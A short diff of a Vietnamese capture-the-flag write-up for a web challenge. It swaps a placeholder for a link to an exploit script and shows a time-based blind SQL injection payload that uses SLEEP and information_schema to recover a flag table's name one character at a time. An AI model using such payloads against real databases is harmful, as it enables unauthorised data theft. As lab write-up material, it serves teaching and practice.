@@ -24,7 +24,7 @@ Oke vậy là MySQL hoặc MariaDB
 
 Ta sẽ dùng Time-based để dò từng ký tự. 
 
-Code exploit: !(https:example.com)
+Code exploit: [Code Exploit](https://github.com/dungNHVhust/WriteupWeb/blob/main/CyRadar/Test%20CTF/Web04/exploit.py)
 
 Tìm tên bảng với payload `(SELECT CASE WHEN ((SELECT SUBSTRING(table_name,{position},1) FROM information_schema.tables WHERE table_name LIKE 'fla%' LIMIT 1)) = '{character}' THEN (SELECT SLEEP(5)) ELSE price END AS result)` để tìm tên bảng. 
 
